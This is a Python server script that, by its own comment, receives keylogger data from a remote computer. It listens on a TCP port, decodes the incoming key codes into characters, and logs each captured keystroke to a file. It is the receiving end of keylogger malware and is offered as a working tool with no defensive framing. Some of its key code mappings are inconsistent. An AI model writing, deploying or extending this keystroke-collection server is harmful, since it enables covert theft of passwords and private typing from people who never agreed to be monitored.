#this server recievese that keylog data from a remote computer
import socket

HOST = '0.0.0.0'
PORT = 7575
key_code_mapping = {
    # Letters
    4: 'a',  5: 'b',  6: 'c',  7: 'd',  8: 'e', 
    9: 'f',  10: 'g', 11: 'h', 12: 'i', 13: 'j', 
    14: 'k', 15: 'l', 16: 'm', 17: 'n', 18: 'o', 
    19: 'p', 20: 'q', 21: 'r', 22: 's', 23: 't', 
    24: 'u', 25: 'v', 26: 'w', 27: 'x', 28: 'y', 
    29: 'z',

    # Numbers
    30: '1', 31: '2', 32: '3', 33: '4', 34: '5', 
    35: '6', 36: '7', 37: '8', 38: '9', 39: '0',

    # Special characters
    40: 'Enter', 41: 'Esc', 42: 'Backspace', 43: 'Tab',
    44: ' ',  # Space
    45: '-', 46: '=', 47: '[', 48: ']', 49: '\\',
    50: ';', 51: '\'', 52: '`', 53: ',', 54: '.',
    55: '/', 56: 'Caps Lock', 57: 'F1', 58: 'F2',
    59: 'F3', 60: 'F4', 61: 'F5', 62: 'F6', 
    63: 'F7', 64: 'F8', 65: 'F9', 66: 'F10',

    # Control keys
    67: 'Num Lock', 68: 'Scroll Lock', 69: 'Home',
    70: 'End', 71: 'Page Up', 72: 'Page Down',
    73: 'Arrow Up', 74: 'Arrow Down', 75: 'Arrow Left',
    76: 'Arrow Right',

    # Modifier keys
    77: 'Shift', 78: 'Ctrl', 79: 'Alt', 80: 'Space',
    # Add more as needed...
}

def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind((HOST,PORT))
        server_socket.listen()

        print(f"Listening on {HOST}:{PORT}...")
        conn, addr = server_socket.accept()
        with conn:
            print(f"Connected wit {addr}")
            with open('keylog.txt', 'w') as log_file:
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    for key_code in data.decode('utf-8').split():
                        try:
                            key_code_int = int(key_code)
                            if key_code_int in key_code_mapping:
                                character = key_code_mapping[key_code_int]
                                print(f"keylogged {character}")
                                log_file.write(character)
                        except ValueError:
                            print(f"invalid code {key_code}")


if __name__ == "__main__":
    start_server()
